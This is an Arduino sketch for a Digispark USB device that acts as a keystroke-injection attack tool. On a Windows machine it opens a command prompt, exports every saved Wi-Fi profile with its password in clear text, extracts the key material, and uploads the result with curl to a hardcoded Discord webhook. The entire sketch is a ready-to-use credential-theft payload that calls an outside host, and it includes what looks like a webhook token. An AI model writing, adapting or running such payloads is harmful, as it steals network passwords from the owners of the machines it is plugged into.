#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi-Fi-* -Pattern 'keyMaterial' > wifi");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("curl -i -H \"Expect:application/json\" -F file=@wifi -F \"payload_json={\\\"wait\\\":true,\\\"content\\\":\\\"WIFI\\\",\\\"username\\\":\\\"POCKETAPE\\\"}\" https://discord.com/api/webhooks/785164444002680872/spKKBKFrr7ZKRPSZ_cXnk2564H2UboFgbOB9rhGVmynHsmhvYbUG90lBA3Q7DJclHSZx");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH); //led on
  for(;;){ /*empty*/ }
}
